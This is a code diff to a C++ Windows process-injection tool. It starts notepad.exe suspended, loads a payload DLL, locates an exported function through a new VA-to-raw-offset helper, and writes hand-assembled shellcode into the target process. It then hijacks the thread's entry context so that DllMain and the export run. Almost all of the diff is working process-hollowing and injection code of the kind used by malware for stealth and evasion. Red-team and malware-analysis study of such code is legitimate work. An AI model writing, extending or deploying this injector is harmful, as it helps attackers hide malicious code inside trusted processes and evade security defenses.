@@ -88,6 +88,20 @@ T iterate_modules(unsigned long funcHash, ModuleIterator& iter) {
 	return NULL;
 }
 
+// Function to convert Virtual Addresses into Raw Addresses
+unsigned long VAtoRA(unsigned long VA, void* pFile) {
+	WinDecls::IMAGE_DOS_HEADER* dosHeader = (WinDecls::IMAGE_DOS_HEADER*)(pFile);
+	WinDecls::IMAGE_SECTION_HEADER* sectionHeader = (WinDecls::IMAGE_SECTION_HEADER*)((unsigned long)pFile + dosHeader->e_lfanew + sizeof(WinDecls::IMAGE_NT_HEADERS));
+	//WinDecls::IMAGE_SECTION_HEADER* sectionHeader = (WinDecls::IMAGE_SECTION_HEADER*)(ntHeaders + sizeof(WinDecls::IMAGE_NT_HEADERS));
+
+	while (VA > sectionHeader->VirtualAddress + sectionHeader->Misc.VirtualSize) sectionHeader++;
+
+	unsigned long offset = VA - sectionHeader->VirtualAddress;
+	unsigned long rawAddr = offset + sectionHeader->PointerToRawData;
+
+	return rawAddr;
+}
+
 LoadLibrary_t pLoadLibrary;
 MessageBox_t  pMessageBox;
 VirtualAlloc_t pVirtualAlloc;
@@ -195,7 +209,7 @@ int main(int argc, char **argv) {
 	pStartupInfo->dwFlags = 0x00000001;     //STARTF_USESHOWWINDOW;
 	pStartupInfo->wShowWindow = 5;		   //SW_SHOW;
 	WinDecls::PROCESS_INFORMATION* pProcessInfo = new WinDecls::PROCESS_INFORMATION();
-	pCreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, 0, 0, 0, CREATESUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
+	pCreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, 0, 0, 0, CREATESUSPENDED, 0, 0, pStartupInfo, pProcessInfo);
 	if (!pProcessInfo->hProcess) {
 		printf("[-] Failed to create process\n");
 		exit(1);
@@ -227,7 +241,7 @@ int main(int argc, char **argv) {
 	// ==================================== READ SOURCE FILE =====================================
 	unsigned long GENERICREAD = 0x80000000;
 	unsigned long OPENALWAYS  = 0x4;
-	void* sourceFile = pCreateFileA("C:\\Windows\\System32\\cmd.exe", GENERICREAD, NULL, NULL, OPENALWAYS, NULL, NULL);
+	void* sourceFile = pCreateFileA("C:\\Users\\user\\source\\repos\\payloadDll\\Release\\payloadDll.dll", GENERICREAD, NULL, NULL, OPENALWAYS, NULL, NULL);
 	unsigned int sourceFileSize = pGetFileSize(sourceFile, NULL);
 	unsigned long* fileBytesRead = 0;
 	// ===========================================================================================
@@ -280,6 +294,12 @@ int main(int argc, char **argv) {
 	}
 	// ===========================================================================================
 
+	// ========================= GET THE DLL FUNCTON "FUNENTRY" ADDRESS ==========================
+	int IMAGE_DIR_ENTRY_EXPORT = 0;
+	WinDecls::IMAGE_EXPORT_DIRECTORY* sourceImgExportDir = (WinDecls::IMAGE_EXPORT_DIRECTORY*)((unsigned long)sourceFileBytesBuffer + VAtoRA((unsigned long)sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIR_ENTRY_EXPORT].VirtualAddress, sourceFileBytesBuffer));
+	unsigned long* pEAT = (unsigned long*)((unsigned long)sourceFileBytesBuffer + VAtoRA(sourceImgExportDir->AddressOfFunctions, sourceFileBytesBuffer));
+	// ===========================================================================================
+
 	// ===================== PATCH THE BINARY WITH THE NEW RELOCATION TABLE ======================
 	int IMAGEDIRECTORY_ENTRY_BASERELOC = 5;
 	WinDecls::IMAGE_DATA_DIRECTORY relocationTable = sourceImageNTHeaders->OptionalHeader.DataDirectory[IMAGEDIRECTORY_ENTRY_BASERELOC];
@@ -327,9 +347,37 @@ int main(int argc, char **argv) {
 	// First it's necessary to fetch the current context of the process
 	pGetThreadContext(pProcessInfo->hThread, context);
 
-	// Patch destination process' entrypoint
-	unsigned long patchedEntryPoint = (unsigned long)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
-	context->Eax = patchedEntryPoint;
+	//// Patch destination process' entrypoint
+	//unsigned long patchedEntryPoint = (unsigned long)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
+	//context->Eax = patchedEntryPoint;
+
+	// Invoking the Dll once it's been written inside target process
+	char shellCode[] = {
+		0x68, 0xdd, 0xdd, 0xdd, 0xdd, // push 0xdddddddd
+		0x68, 0xdd, 0xdd, 0xdd, 0xdd, // push 0xdddddddd
+		0x68, 0xdd, 0xdd, 0xdd, 0xdd, // push 0xdddddddd
+		0x68, 0xdd, 0xdd, 0xdd, 0xdd, // push 0xdddddddd
+		0xb8, 0xdd, 0xdd, 0xdd, 0xdd, // mod eax, 0xdddddddd
+		0xff, 0xe0, // jmp eax
+	};
+
+	// Populate 3rd, 2nd and 1st parameters of DllMain, respectively
+	*((unsigned long*)(shellCode + 1)) = 0; 
+	*((unsigned long*)(shellCode + 6)) = 1;
+	*((unsigned long*)(shellCode + 11)) = (unsigned long)destImageBase;
+	
+	
+	*((unsigned long*)(shellCode + 16)) = (unsigned long)destImageBase + pEAT[1];
+	*((unsigned long*)(shellCode + 21)) = (unsigned long)destImageBase + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
+	
+	void* addressBuffer = pVirtualAllocEx(pProcessInfo->hProcess, NULL, sizeof(shellCode), MEMCOMMIT | MEMRESERVE, PAGEEXECUTEREADWRITE);
+	bool successfulWrite = pWriteProcessMemory(pProcessInfo->hProcess, addressBuffer, shellCode, sizeof(shellCode), NULL);
+	if (!successfulWrite) {
+		printf("Failed to write shellcode inside target process\n");
+		exit(1);
+	}
+		
+	context->Eax = (unsigned long)addressBuffer;
 	pSetThreadContext(pProcessInfo->hThread, context);
 	pResumeThread(pProcessInfo->hThread);
 	// ===========================================================================================
